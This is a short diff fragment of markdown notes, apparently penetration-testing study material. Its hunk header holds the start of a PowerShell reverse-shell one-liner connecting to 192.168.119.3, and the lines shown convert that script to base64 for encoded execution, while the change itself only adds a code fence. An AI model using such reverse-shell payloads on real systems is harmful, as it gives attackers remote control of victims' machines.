@@ -8,5 +8,6 @@ PS> $Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.119.3",4
 ```
 PS> $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text) 
 ```
+```
 PS> $EncodedText =[Convert]::ToBase64String($Bytes)
 ```
